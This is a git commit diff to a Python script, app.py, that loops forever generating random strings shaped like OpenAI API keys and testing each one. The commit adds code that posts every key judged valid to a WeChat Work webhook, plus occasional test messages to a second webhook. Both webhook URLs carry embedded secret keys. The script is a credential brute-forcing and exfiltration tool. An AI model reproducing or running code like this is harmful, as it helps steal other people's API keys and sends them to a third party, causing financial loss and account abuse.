e10963876d030254889e8e768f53ed1cb865c752
ZHtwinkle <79469234+ZHtwinkle@users.noreply.github.com>
2023-06-20 16:36:37 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,8 +1,11 @@
 import requests
 import string
 from random import choice as ci
+from random import randint as rd
 SS=string.ascii_letters+string.digits
 url="https://api.zhtwinkle.cn/v1/chat/completions"
+bot="https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=9848af67-323c-4bdb-800e-8f4eb48d382a"
+bot2="https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=1b3989e7-efb6-4520-b6f3-1c22d50300e2"
 json1={
      "model":"gpt-3.5-turbo",
      "messages": [
@@ -37,9 +40,18 @@ def g20():
     for i in range(20):
         ans+=ci(SS)
     return ans
+def send(Key,st,bo):
+    json={
+        "msgtype":"text",
+        "text":{"content":Key+"\n"+st}
+    }
+    requests.post(url=bo,json=json)
 while True:
+    x=rd(1,1000)
     Key="sk-"+g20()+"T3BlbkFJ"+g20()
     if f(Key):
-        print(Key)
-    else:
-        print(Key+"  ：不合法")
+        st="合法"
+        send(Key,st,bot)
+    if x==1:
+        send(Key,"测试",bot2)
+    
